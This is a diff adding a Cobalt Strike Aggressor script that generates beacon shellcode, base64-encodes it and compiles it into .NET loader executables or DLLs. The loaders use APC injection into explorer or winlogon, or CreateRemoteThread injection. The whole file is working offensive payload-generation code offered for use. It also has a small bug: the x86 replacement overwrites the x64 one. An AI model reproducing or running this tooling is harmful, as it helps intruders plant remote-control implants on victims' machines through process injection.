@@ -1,0 +1,150 @@
+#https://www.cobaltstrike.com/aggressor-script/functions.html
+#https://github.com/harleyQu1nn/AggressorScripts/blob/master/CertUtilWebDelivery.cna
+
+sub compile {
+	# Set variables
+	$file = $1;
+	$outputformat = $2;
+	$version = iff($3 eq "true", "net35", "net40");
+	$outfile = $4;
+
+	# Compile
+	@command = @("bash", script_resource("compilerscript.sh"), script_resource("Compiler/bin/Release/netcoreapp2.1/Compiler.dll"), $file, $outfile, $version, $outputformat);
+	exec(@command);
+
+	# https://github.com/SpiderLabs/SharpCompile/blob/master/SharpCompile.cna
+	# Workaround to make sure full binary has been received
+	# Increase sleep if your binary fails to compile from CS
+	# change this
+	sleep(1000);
+	$size = -1;
+	$timeout = 10000;
+	while ((!-exists $outfile || $size < 0 || $size < $newsize) && $timeout > 0) {
+		$size = $newsize;
+		$newsize = lof($outfile);
+		sleep(100);
+		$timeout -= 1;
+	}
+	sleep(1000);
+	# If compiling failed, return ""
+	if($timeout <= 0)
+	{
+		return "";
+	}
+	return $outfile;
+}
+
+sub apc_executable {
+	# Set variables
+	global('$version $outputformat $file');
+	local('%options $listener $rawshellcode $shellcode $apc $newapc $handle $apcoutfile');
+	%options = $3;		
+	$version = iff(%options["dotnet35"] eq "true", "net35", "net40");
+	$listener = %options["listener"];
+	$outputformat = %options["output"];
+	
+	# Generate shellcode and base64 it
+	$rawshellcode  = artifact_payload($listener, "raw", "x64");
+	$shellcode = base64_encode($rawshellcode);
+		
+	# Replace junk with shellcode
+	$handle = openf(script_resource("APC_TEMPLATE.cs"));
+	$apc = readb($handle, -1);
+	closef($handle);
+	$newapc = strrep($apc, 'REPLACETHISWITHSHELLCODE', $shellcode);
+
+	# Write the new .cs file to disk
+	$apcoutfile = script_resource("APC.cs");
+	$handle = openf("> $apcoutfile");
+    writeb($handle, $newapc);
+    closef($handle);
+
+	# Prompt for save location and compile
+	prompt_file_save($null, {
+		loca('$outfile');
+		$outfile = compile(script_resource("APC.cs"), $outputformat, $version, $1 );
+		if($outfile eq "")
+		{
+			show_message("Compiling failed");
+			return;
+		}
+		else{
+			show_message("Compiling successful");
+			return;
+		}
+	});
+}
+
+sub crt_executable {
+	# Set variables
+	global('$version $outputformat $file');
+	local('%options $listener $rawshellcodex64 $rawshellcodex86 $shellcodex64 $shellcodex86 $crt $newcrt $handle $crtoutfile');
+	%options = $3;		
+	$version = iff(%options["dotnet35"] eq "true", "net35", "net40");
+	$listener = %options["listener"];
+	$outputformat = %options["output"];
+	
+	# Generate shellcode and base64 it
+	$rawshellcodex64  = artifact_payload($listener, "raw", "x64");
+	$shellcodex64 = base64_encode($rawshellcodex64);
+	$rawshellcodex86  = artifact_payload($listener, "raw", "x86");
+	$shellcodex86 = base64_encode($rawshellcodex86);
+		
+	# Replace junk with shellcode
+	$handle = openf(script_resource("CRT_TEMPLATE.cs"));
+	$crt = readb($handle, -1);
+	closef($handle);
+	$newcrt = strrep($crt, 'REPLACETHISWITHSHELLCODEX64', $shellcodex64);
+	$newcrt = strrep($crt, 'REPLACETHISWITHSHELLCODEX86', $shellcodex86);
+
+	# Write the new .cs file to disk
+	$crtoutfile = script_resource("CRT.cs");
+	$handle = openf("> $crtoutfile");
+    writeb($handle, $newcrt);
+    closef($handle);
+
+	# Prompt for save location and compile
+	prompt_file_save($null, {
+		loca('$outfile');
+		$outfile = compile(script_resource("CRT.cs"), $outputformat, $version, $1 );
+		if($outfile eq "")
+		{
+			show_message("Compiling failed");
+			return;
+		}
+		else{
+			show_message("Compiling successful");
+			return;
+		}
+	});
+}
+
+# Create a popup menu
+popup attacks {
+	menu "&Dotnet Executables" {
+		item "APC Shellcode Loader X64 (S)" {
+			local('$dialog %defaults');
+			# Create our dialog
+			$dialog = dialog("APC Shellcode loader (Stageless)", %defaults, &apc_executable);
+			dialog_description($dialog, "An APC loader that injects a cobalt strike beacon into explorer/winlogon");
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			drow_combobox($dialog, "output", "Output: ", @("exe"));
+			drow_checkbox($dialog, "dotnet35", "dotnet35: ", "Compile for dotnet35 instead of dotnet40");
+			dbutton_action($dialog, "Generate");
+			# Show our dialog
+			dialog_show($dialog);
+		}
+		item "CreateRemoteThread Shellcode Loader x86/64 (S)" {
+			local('$dialog %defaults');
+			# Create our dialog
+			$dialog = dialog("CreateRemoteThread Shellcode loader (Stageless)", %defaults, &crt_executable);
+			dialog_description($dialog, "An CreateRemoteThread loader that injects a cobalt strike beacon into itself");
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			drow_combobox($dialog, "output", "Output: ", @("exe","dll"));
+			drow_checkbox($dialog, "dotnet35", "dotnet35: ", "Compile for dotnet35 instead of dotnet40");
+			dbutton_action($dialog, "Generate");
+			# Show our dialog
+			dialog_show($dialog);
+		}
+	}
+}
